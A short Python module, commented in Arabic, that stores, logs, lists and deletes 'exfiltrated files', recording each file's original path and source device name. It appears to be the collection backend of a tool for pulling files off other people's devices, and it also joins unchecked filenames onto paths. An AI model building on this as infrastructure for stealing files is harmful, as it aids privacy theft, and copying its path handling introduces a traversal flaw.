import os
import json
from datetime import datetime
from pathlib import Path

# مسار مجلد الملفات المسحوبة
EXFILTRATED_DIR = "exfiltrated_files"
EXFILTRATED_LOG = "exfiltrated_log.json"

# إنشاء المجلد إذا لم يكن موجوداً
os.makedirs(EXFILTRATED_DIR, exist_ok=True)

def save_exfiltrated_file(file_obj, filename, original_path="", device_name="Unknown"):
    """
    حفظ الملف المسحوب وتسجيل معلوماته
    """
    try:
        # إنشاء مسار فريد للملف
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_filename = f"{timestamp}_{filename}"
        file_path = os.path.join(EXFILTRATED_DIR, safe_filename)
        
        # حفظ الملف
        with open(file_path, 'wb') as f:
            f.write(file_obj.read())
        
        # تسجيل معلومات الملف
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "filename": filename,
            "original_path": original_path,
            "device_name": device_name,
            "saved_path": file_path,
            "file_size": os.path.getsize(file_path)
        }
        
        # إضافة إلى السجل
        log_data = []
        if os.path.exists(EXFILTRATED_LOG):
            with open(EXFILTRATED_LOG, 'r', encoding='utf-8') as f:
                try:
                    log_data = json.load(f)
                except:
                    log_data = []
        
        log_data.append(log_entry)
        
        with open(EXFILTRATED_LOG, 'w', encoding='utf-8') as f:
            json.dump(log_data, f, ensure_ascii=False, indent=2)
        
        return True, file_path
    
    except Exception as e:
        return False, str(e)

def get_exfiltrated_files():
    """
    الحصول على قائمة الملفات المسحوبة
    """
    try:
        if os.path.exists(EXFILTRATED_LOG):
            with open(EXFILTRATED_LOG, 'r', encoding='utf-8') as f:
                return json.load(f)
        return []
    except:
        return []

def delete_exfiltrated_file(filename):
    """
    حذف ملف مسحوب
    """
    try:
        file_path = os.path.join(EXFILTRATED_DIR, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            
            # تحديث السجل
            log_data = get_exfiltrated_files()
            log_data = [f for f in log_data if f.get('saved_path') != file_path]
            
            with open(EXFILTRATED_LOG, 'w', encoding='utf-8') as f:
                json.dump(log_data, f, ensure_ascii=False, indent=2)
            
            return True
        return False
    except:
        return False

def get_file_download_path(filename):
    """
    الحصول على مسار الملف للتحميل
    """
    return os.path.join(EXFILTRATED_DIR, filename)
